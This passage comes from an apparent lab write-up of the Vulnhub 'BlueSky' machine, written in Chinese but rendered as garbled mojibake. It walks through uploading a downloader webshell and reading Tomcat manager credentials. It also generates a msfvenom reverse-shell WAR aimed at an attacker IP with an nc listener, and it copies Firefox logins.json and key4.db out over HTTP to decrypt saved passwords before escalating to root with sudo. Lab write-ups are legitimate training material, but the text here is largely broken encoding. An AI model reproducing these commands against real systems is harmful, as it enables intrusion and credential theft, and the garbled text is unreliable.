å¤§é©¬ä¼šè¶…å‡ºå­—èŠ‚é™åˆ¶</p><p>ä¸Šä¼ å†°èçš„é©¬å†°èä¼šæ— æ³•è¯†åˆ«webshellçš„å¯†ç </p><p>ç›´æ¥ä¸Šä¼ èšå‰‘çš„é©¬ä¹Ÿä¼šè¶…å‡ºå­—èŠ‚é™åˆ¶</p><p>é‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>å¾ˆå¥½è§£å†³ï¼Œé¦–å…ˆæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªä¸‹è½½æ–‡ä»¶çš„ä¸€å¥è¯æœ¨é©¬</p><img src="/2021/10/07/BlueSky/image13.png" class="" title="image13"><p>å¾—åˆ°webshellåœ°å€</p><p><a href="http://192.168.72.131:8080/struts2-showcase/111.jsp">http://192.168.72.131:8080/struts2-showcase/111.jsp</a></p><p>ç„¶ååœ¨æœ¬åœ°æ­å»ºä¸€ä¸ªwebæœåŠ¡å™¨ï¼ŒæŠŠè¦ä½¿ç”¨çš„ä¸€å¥è¯æœ¨é©¬æˆ–å¤§é©¬æ”¾åœ¨é‡Œé¢ï¼Œä½¿ç”¨è¯¥ä¸€å¥è¯æœ¨é©¬è¿›è¡Œè®¿é—®ä¸‹è½½</p><p><a href="http://192.168.72.131:8080/struts2-showcase/111.jsp?f=/usr/local/tomcat/webapps/struts2-showcase/222.jsp&u=http://192.168.0.159/333.jsp">http://192.168.72.131:8080/struts2-showcase/111.jsp?f=/usr/local/tomcat/webapps/struts2-showcase/222.jsp&u=http://192.168.0.159/333.jsp</a></p><p>ä¸Šé¢çš„222.jspæ˜¯è¦ä¿å­˜çš„webshellé©¬åå­—</p><p>333.jspæ˜¯æˆ‘ä»¬åœ¨æœ¬åœ°webæœåŠ¡å™¨å†…å‚¨å­˜çš„åå­—</p><p>111.jspæ˜¯å½“å‰çš„ä¸‹è½½é©¬</p><img src="/2021/10/07/BlueSky/image14.png" class="" title="image14"><p>æˆåŠŸä¸‹è½½èšå‰‘çš„ä¸€å¥è¯æœ¨é©¬</p><img src="/2021/10/07/BlueSky/image15.png" class="" title="image15"><p>å¯ä»¥æˆåŠŸè®¿é—®æ–‡ä»¶ï¼Œä½†æˆ‘ä»¬å‘ç°è¯¥ä¸€å¥è¯æœ¨é©¬ä¼¼ä¹æ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>å°é—®é¢˜ï¼Œæˆ‘ä»¬åˆ©ç”¨tomcatæœ¬èº«çš„æ¼æ´è¿›è¡Œææƒå°±å¥½äº†</p><p>é¦–å…ˆæ‰¾åˆ°tomcatçš„è´¦å·æœ¨é©¬</p><p>åœ°å€ï¼š&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;conf&#x2F;tomcat-users.xml</p><p>ç¬¬45è¡Œ</p><user username="admin" password="6mzf3>gfZ.pN8_Mp" roles="manager-gui"/><p>æˆåŠŸå¾—åˆ°</p><p>è´¦å·ï¼šadmin</p><p>å¯†ç ï¼š6mzf3&gt;gfZ.pN8_Mp</p><img src="/2021/10/07/BlueSky/image16.png" class="" title="image16"><p>æ³¨æ„ï¼šæ­¤æ–¹æ³•è¾ƒä¸ºéº»çƒ¦ï¼Œä¸»è¦ç”¨äºæ— æ³•ä½¿ç”¨ncå¼¹å›shellçš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œæˆ‘è¿™è¾¹ä½¿ç”¨äº†å„ä¸ªæ–¹æ³•éƒ½æ— æ³•å¼¹å›ï¼Œä¸å¾—å·²ä¹‹ä¸‹æ‰ä½¿ç”¨è¿™ä¸ªæ–¹æ³•</p><p>ç°åœ¨æˆ‘ä»¬å›åˆ°ç½‘é¡µå»ç™»å½•è´¦å·å¯†ç </p><img src="/2021/10/07/BlueSky/image17.png" class="" title="image17"><p>ç™»é™†åçš„çŠ¶æ€</p><img src="/2021/10/07/BlueSky/image18.png" class="" title="image18"><p>æˆ‘ä»¬å‘ç°ä¸‹é¢å¯ä»¥éƒ¨ç½²æ–‡ä»¶ï¼ŒOK é‚£å°±å¥½åŠäº†</p><p>ä½¿ç”¨WARæœ¨é©¬ä¸Šä¼ åå¼¹shellå°±æå®šäº†</p><p>ä½¿ç”¨msfvenomç”Ÿæˆwaré©¬</p><p>msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.72.133 LPORT&#x3D;5555 -f war -o shell.war</p><img src="/2021/10/07/BlueSky/image19.png" class="" title="image19"><p>OK æˆ‘ä»¬å»ä¸Šä¼ </p><img src="/2021/10/07/BlueSky/image20.png" class="" title="image20"><p>æˆåŠŸä¸Šä¼ åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°&#x2F;shell è¿™å°±æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„waré©¬</p><p>åœ¨kaliä¸­ç›‘å¬5555ç«¯å£</p><p>Nc â€“nvlp 5555</p><img src="/2021/10/07/BlueSky/image21.png" class="" title="image21"><p>ç„¶åå»è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„waré©¬</p><p>curl <a href="http://192.168.72.131:8080/shell/">http://192.168.72.131:8080/shell/</a></p><img src="/2021/10/07/BlueSky/image22.png" class="" title="image22"><p>OK æˆ‘ä»¬æˆåŠŸè·å–åˆ°ä¸€ä¸ªshell</p><img src="/2021/10/07/BlueSky/image23.png" class="" title="image23"><p>åŒæ ·çš„æˆ‘ä»¬ä½¿ç”¨python3è·å–ä¸€ä¸ªäº¤äº’å¼shell</p><p>python3 -c â€˜import pty; pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™</p><img src="/2021/10/07/BlueSky/image24.png" class="" title="image24"><p>æŸ¥çœ‹user.txtæ–‡ä»¶ æˆåŠŸè·å–userè´¦æˆ·çš„flag</p><img src="/2021/10/07/BlueSky/image25.png" class="" title="image25"><p>æˆ‘ä»¬æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶</p><p>Ls â€“a</p><img src="/2021/10/07/BlueSky/image26.png" class="" title="image26"><p>åœ¨ç”¨æˆ·æ ¹ç›®å½•ä¸‹å‘ç°mozilla firefoxæµè§ˆå™¨æ–‡ä»¶</p><p>å¯¹æˆ‘æ¥è¯´ï¼Œæœ€æƒ³è¦å¾—åˆ°çš„å°±æ˜¯å®ƒçš„ç”¨æˆ·åå¯†ç è®°å½•</p><p>ä¸åŒç‰ˆæœ¬çš„Firefoxä¿å­˜å¯†ç è®°å½•çš„æ–‡ä»¶åç§°ä¸åŒï¼Œåœ¨ç½‘ä¸Šæ‰¾åˆ°firefoxæµè§ˆå™¨å­˜å‚¨ç”¨æˆ·åå¯†ç çš„æ–‡ä»¶æ˜¯logins.jsonï¼ˆç‰ˆæœ¬å·å¤§äºç­‰äº32.0ï¼‰æˆ–è€…signons.sqliteï¼ˆç‰ˆæœ¬å·å¤§äºç­‰äº3.5ï¼Œå°äº32.0ï¼‰ï¼Œ</p><p>å…·ä½“ä¿¡æ¯å‚è€ƒï¼š<a href="http://kb.mozillazine.org/Profile_folder_-_Firefox">http://kb.mozillazine.org/Profile_folder_-_Firefox</a></p><p>è¿›å…¥ä½ç½®</p><p>.mozilla&#x2F;firefox&#x2F;fvbljmev.default-release</p><p>å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªæ–‡ä»¶</p><p>key4.db logins.json</p><p>æˆ‘ä»¬è¦æŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶æå‡ºæ¥</p><p>ä½¿ç”¨python3å¼€å¯webæœåŠ¡å™¨</p><p>python3 -m http.server 6666</p><p>ä½¿ç”¨wgetæˆåŠŸæ‹·è´ä¸¤ä¸ªæ–‡ä»¶</p><p>wget <a href="http://192.168.72.131:6666/logins.json">http://192.168.72.131:6666/logins.json</a></p><p>wget <a href="http://192.168.72.131:6666/key4.db">http://192.168.72.131:6666/key4.db</a></p><img src="/2021/10/07/BlueSky/image27.png" class="" title="image27"><p>ä¸‹è½½è§£å¯†è„šæœ¬</p><p><a href="https://github.com/lclevy/firepwd">https://github.com/lclevy/firepwd</a></p><p>git clone <a href="https://github.com/lclevy/firepwd.git">https://github.com/lclevy/firepwd.git</a></p><p>cd firepwd</p><p>pip3 install -r requirements.txt</p><img src="/2021/10/07/BlueSky/image28.png" class="" title="image28"><p>è¿è¡Œpython3 firepwd.py</p><p><a href="https://twitter.com:b'minhtuan',b'skysayohyeah">https://twitter.com:b'minhtuan',b'skysayohyeah</a>â€˜</p><p>å¾—åˆ°è´¦å·ï¼šminhtuan</p><p>å¾—åˆ°å¯†ç ï¼šskysayohyeah</p><p>æˆ‘ä»¬ä½¿ç”¨sudo â€“læŸ¥çœ‹sudoæƒé™</p><img src="/2021/10/07/BlueSky/image29.png" class="" title="image29"><p>æƒé™æŒºé«˜ ç›´æ¥sudo suå³å¯æˆåŠŸææƒ</p><img src="/2021/10/07/BlueSky/image30.png" class="" title="image30"><img src="/2021/10/07/BlueSky/image31.png" class="" title="image31"><p>æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag</p><p>æœ¬æ¬¡é¶åœºå®Œæˆ</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
